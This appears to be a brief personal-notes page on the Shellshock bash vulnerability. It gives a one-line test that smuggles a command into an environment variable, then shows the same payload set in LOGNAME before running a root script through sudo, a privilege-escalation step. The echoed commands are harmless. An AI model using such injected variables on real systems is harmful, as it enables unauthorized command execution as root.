## Shellshock

Test to see if the shellshock vulnerability exists. The following script will attempt to create a variable. 

	jwalley='() { :;}; echo MyFeedback' bash -c :

If this is successful try adding this to a variable in the environmentals  for the user. Type env to find this info See example below:

	LOGNAME='() { :;}; echo PleaseSubscribe' sudo /root/troll

Return to [[-README]]